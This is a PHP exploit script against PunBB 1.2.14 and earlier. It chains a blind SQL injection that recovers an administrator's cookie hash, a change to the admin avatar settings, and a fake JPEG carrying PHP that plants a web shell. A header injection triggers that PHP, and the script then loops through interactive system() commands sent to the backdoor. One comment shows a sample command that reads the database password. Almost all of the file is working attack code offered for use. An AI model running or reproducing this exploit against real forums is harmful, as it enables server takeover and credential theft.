#!/usr/bin/php
<?php
/**
 * This file require the PhpSploit class.
 * If you want to use this class, the latest
 * version can be downloaded from acid-root.new.fr.
 **/
require("phpsploitclass.php");
error_reporting(E_ALL ^ E_NOTICE);

if($argc < 7)
{
print("
-----------  PunBB <= 1.2.14 Remote Code Execution Exploit  -----------
-----------------------------------------------------------------------
PHP conditions: See www.acid-root.new.fr/advisories/13070411.txt
       Credits: DarkFig <gmdarkfig@gmail.com>
           URL: http://www.acid-root.new.fr/
-----------------------------------------------------------------------
  Usage: $argv[0] -url <> -usr <> -pwd <> [Options]
 Params: -url       For example http://victim.com/punBB/
         -usr       User account (1 post at least)
         -pwd       Password account
Options: -uid       Admin id (default=2)
         -prefix    Table prefix (default=none)
         -proxy     If you wanna use a proxy <proxyhost:proxyport>
         -proxyauth Basic authentification <proxyuser:proxypwd>
-----------------------------------------------------------------------
");exit(1);
}

$url = getparam('url',1);
$usr = getparam('usr',1);
$pwd = getparam('pwd',1);
$uid = (getparam('uid')!='') ? getparam('uid') : 2;
$pre = getparam('prefix');
$prox= getparam('proxy');
$proh= getparam('proxyauth');

$xpl = new phpsploit();
$xpl->agent("Mozilla Firefox");
if(!empty($prox)) $xpl->addproxy($prox);
if(!empty($proh)) $xpl->proxyauth($proh);

$xpl->cookiejar(1);
$xpl->post($url.'login.php?action=in',"form_sent=1&redirect_url=x&req_username=$usr&req_password=$pwd&login=1");

print "\nCookie hash: ";$cookie = blind($uid);
print "\nAdmin cookie: ".$cookie;

# Logged in as Administrator
$xpl->reset('cookie');
$xpl->addcookie($cookie);
# Avatars dir -> include/user
# Default options (french)
$data =
'form_sent=1&form%5Bboard_title%5D=Mon+forum+punBB&form%5Bboar'
.'d_desc%5D=Malheureusement+personne+ne+peut+vous+dire+ce+que+'
.'PunBB+est+-+vous+devez+le+voir+par+vous-m%EAme.&form%5Bbase_'
.'url%5D='.urlencode(preg_replace("#(.*)/$#","$1",$url)).'&form%5B'
.'server_timezone%5D=0&form%5Bdefault_lang%5D=English&form%5Bd'
.'efault_style%5D=Oxygen&form%5Btime_format%5D=H%3Ai%3As&form%'
.'5Bdate_format%5D=d-m-Y&form%5Btimeout_visit%5D=600&form%5Bti'
.'meout_online%5D=300&form%5Bredirect_delay%5D=1&form%5Bshow_v'
.'ersion%5D=0&form%5Bshow_user_info%5D=1&form%5Bshow_post_coun'
.'t%5D=1&form%5Bsmilies%5D=1&form%5Bsmilies_sig%5D=1&form%5Bma'
.'ke_links%5D=1&form%5Btopic_review%5D=15&form%5Bdisp_topics_d'
.'efault%5D=30&form%5Bdisp_posts_default%5D=25&form%5Bindent_n'
.'um_spaces%5D=4&form%5Bquickpost%5D=1&form%5Busers_online%5D='
.'1&form%5Bcensoring%5D=0&form%5Branks%5D=1&form%5Bshow_dot%5D'
.'=0&form%5Bquickjump%5D=1&form%5Bgzip%5D=0&form%5Bsearch_all_'
.'forums%5D=1&form%5Badditional_navlinks%5D=&form%5Breport_met'
.'hod%5D=0&form%5Bregs_report%5D=0&form%5Bmailing_list%5D=gmda'
.'rkfig%40gmail.com&form%5Bavatars%5D=1&form%5Bavatars_dir%5D='
.'include%2Fuser&form%5Bavatars_width%5D=60&form%5Bavatars_hei'
.'ght%5D=60&form%5Bavatars_size%5D=10240&form%5Badmin_email%5D'
.'=mysploiti%40gmail.com&form%5Bwebmaster_email%5D=mysploiti%4'
.'0gmail.com&form%5Bsubscriptions%5D=1&form%5Bsmtp_host%5D=&fo'
.'rm%5Bsmtp_user%5D=&form%5Bsmtp_pass%5D=&form%5Bregs_allow%5D'
.'=1&form%5Bregs_verify%5D=0&form%5Brules%5D=0&form%5Brules_me'
.'ssage%5D=Saisissez+vos+r%E8gles+ici.&form%5Bannouncement%5D='
.'0&form%5Bannouncement_message%5D=Saisissez+votre+annonce+ici'
.'.&form%5Bmaintenance%5D=0&form%5Bmaintenance_message%5D=Les+'
.'forums+sont+temporairement+ferm%E9s+pour+des+raisons+de+main'
.'tenance.+Veuillez+essayer+%E0+nouveau+dans+quelques+minutes.'
.'%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%2FAdministrateur&save=+'
.'Enregistrer+';

$xpl->addheader('Referer',$url.'admin_options.php');
$xpl->post($url.'admin_options.php?action=foo',$data);


# Fake JPG 1x1
#
# 000000A2 3C3F 7068 7020 2468 616E 646C 653D 666F <?php $handle=fo
# 000000B2 7065 6E28 222E 2F69 6D67 2F61 7661 7461 pen("./img/avata
# 000000C2 7273 2F62 6163 6B64 6F6F 722E 7068 7022 rs/backdoor.php"
# 000000D2 2C22 7722 293B 2066 7772 6974 6528 2468 ,"w"); fwrite($h
# 000000E2 616E 646C 652C 273C 3F70 6870 2069 6628 andle,'<?php if(
# 000000F2 6973 7365 7428 245F 5345 5256 4552 5B22 isset($_SERVER["
# 00000102 4854 5450 5F53 4845 4C4C 225D 2929 2040 HTTP_SHELL"])) @
# 00000112 6576 616C 2824 5F53 4552 5645 525B 2248 eval($_SERVER["H
# 00000122 5454 505F 5348 454C 4C22 5D29 3B20 3F3E TTP_SHELL"]); ?\>
# 00000132 2729 3B20 6663 6C6F 7365 2824 6861 6E64 '); fclose($hand
# 00000142 6C65 293B 203F 3E                       le); ?\>
$avatar =
"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x60"
."\x00\x60\x00\x00\xFF\xDB\x00\x43\x00\x08\x06\x06\x07\x06\x05"
."\x08\x07\x07\x07\x09\x09\x08\x0A\x0C\x14\x0D\x0C\x0B\x0B\x0C"
."\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C\x20\x24"
."\x2E\x27\x20\x22\x2C\x23\x1C\x1C\x28\x37\x29\x2C\x30\x31\x34"
."\x34\x34\x1F\x27\x39\x3D\x38\x32\x3C\x2E\x33\x34\x32\xFF\xDB"
."\x00\x43\x01\x09\x09\x09\x0C\x0B\x0C\x18\x0D\x0D\x18\x32\x21"
."\x1C\x21\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32"
."\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32"
."\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32"
."\x32\x32\x32\x32\x32\x32\x32\xFF\xFE\x00\xA9\x3C\x3F\x70\x68"
."\x70\x20\x24\x68\x61\x6E\x64\x6C\x65\x3D\x66\x6F\x70\x65\x6E"
."\x28\x22\x2E\x2F\x69\x6D\x67\x2F\x61\x76\x61\x74\x61\x72\x73"
."\x2F\x62\x61\x63\x6B\x64\x6F\x6F\x72\x2E\x70\x68\x70\x22\x2C"
."\x22\x77\x22\x29\x3B\x20\x66\x77\x72\x69\x74\x65\x28\x24\x68"
."\x61\x6E\x64\x6C\x65\x2C\x27\x3C\x3F\x70\x68\x70\x20\x69\x66"
."\x28\x69\x73\x73\x65\x74\x28\x24\x5F\x53\x45\x52\x56\x45\x52"
."\x5B\x22\x48\x54\x54\x50\x5F\x53\x48\x45\x4C\x4C\x22\x5D\x29"
."\x29\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x53\x45\x52\x56\x45"
."\x52\x5B\x22\x48\x54\x54\x50\x5F\x53\x48\x45\x4C\x4C\x22\x5D"
."\x29\x3B\x20\x3F\x3E\x27\x29\x3B\x20\x66\x63\x6C\x6F\x73\x65"
."\x28\x24\x68\x61\x6E\x64\x6C\x65\x29\x3B\x20\x3F\x3E\xFF\xC0"
."\x00\x11\x08\x00\x01\x00\x01\x03\x01\x22\x00\x02\x11\x01\x03"
."\x11\x01\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01"
."\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06"
."\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x10\x00\x02\x01\x03\x03"
."\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7D\x01\x02\x03\x00"
."\x04\x11\x05\x12\x21\x31\x41\x06\x13\x51\x61\x07\x22\x71\x14"
."\x32\x81\x91\xA1\x08\x23\x42\xB1\xC1\x15\x52\xD1\xF0\x24\x33"
."\x62\x72\x82\x09\x0A\x16\x17\x18\x19\x1A\x25\x26\x27\x28\x29"
."\x2A\x34\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49"
."\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68"
."\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x83\x84\x85\x86\x87"
."\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4"
."\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA"
."\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7"
."\xD8\xD9\xDA\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2"
."\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xC4\x00\x1F\x01\x00\x03"
."\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00"
."\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5"
."\x11\x00\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\x00\x01"
."\x02\x77\x00\x01\x02\x03\x11\x04\x05\x21\x31\x06\x12\x41\x51"
."\x07\x61\x71\x13\x22\x32\x81\x08\x14\x42\x91\xA1\xB1\xC1\x09"
."\x23\x33\x52\xF0\x15\x62\x72\xD1\x0A\x16\x24\x34\xE1\x25\xF1"
."\x17\x18\x19\x1A\x26\x27\x28\x29\x2A\x35\x36\x37\x38\x39\x3A"
."\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59"
."\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78"
."\x79\x7A\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95"
."\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2"
."\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8"
."\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE2\xE3\xE4\xE5"
."\xE6\xE7\xE8\xE9\xEA\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF"
."\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00\xF7\xFA"
."\x28\xA2\x80\x3F\xFF\xD9";

# Upload
$formdata = array(frmdt_url => $url.'profile.php?action=upload_avatar2&id='.$uid,
                  'form_sent' => '1',
                  'MAX_FILE_SIZE' => '10240',
                  'upload' => 'T?l?charger',
                  'req_file' => array(frmdt_filename => 'pic.jpg',
                                      frmdt_type => 'image/jpeg',
                                      frmdt_content => $avatar));
$xpl->addheader('Referer',$url.'profile.php');
$xpl->formdata($formdata);

# File inclusion
$xpl->addheader('Referer',$url."misc.php\"><pun_include \"$uid.jpg\">");
$xpl->get($url.'misc.php?email='.$uid);
print "\nThe php code shoulb be executed\n\$shell> ";

# Hello
while(!preg_match("#^(quit|exit)$#",($cmd = trim(fgets(STDIN)))))
{
    # ');include('../../config.php');print $db_password;//
    $xpl->addheader('Shell',"system('$cmd');");
    $xpl->get($url.'img/avatars/backdoor.php');
    print $xpl->getcontent()."\n\$shell> ";
}

function blind($id)
{
        global $xpl,$url,$usr,$pre;

        preg_match("#^(\S*)=(\S*);#",$xpl->showcookie(),$cookies);
        $name=$cookies[1]."=";
        $string="a:2:{i:0;s:1:\"$id\";i:1;s:32:\"";

        for($i=1;$i<=32;$i++)
        {
                $charset = '0123456789abcdef';
                for($a=0;$a<=strlen($charset);$a++)
                {
                        # Search cache
                        $searchd = 'search.php?action=search&keywords=*****&author='
                                  .$usr.'&forum=-1&search_in=all&sort_by=0&sort_dir=DESC&show_as=topics&search=1';
                        $xpl->get($url.$searchd);

                        # Cookie hash
                        $sql = 'ORD(SUBSTR(('
                              .'SELECT MD5('
                              .'CONCAT('
                              .'SUBSTR('
                              .'MD5('
                              # Cookie seed
                              .'(SELECT registered FROM '.$pre.'users WHERE LENGTH(registered)=10'
                              .' ORDER BY registered LIMIT 1)),-8),'
                              # Hashed password
                              .'(SELECT password FROM '.$pre.'users WHERE
id='.$id.')))),'.$i.',1))=ORD(CHAR('.ord($charset[$a]).')) #';

                        # SQL Injection
                        $xpl->post($url.'search.php?action=show_new','search_id=-1 OR
'.$sql.'&1986084953=1&-1234899993=1');

                        # True
                        if(preg_match('#<th class="tcr" scope="col">#',$xpl->getcontent()))
                        {
                                print $charset[$a];
                                $string .= $charset[$a];
                                break;
                        }
                }
        }
        return $name.urlencode($string.'";}');
}

function getparam($param,$opt='')
{
        global $argv;
        foreach($argv as $value => $key)
        {
                if($key == '-'.$param) return $argv[$value+1];
        }
        if($opt) exit("\n#3 -$param parameter required");
        else return;
}
?>
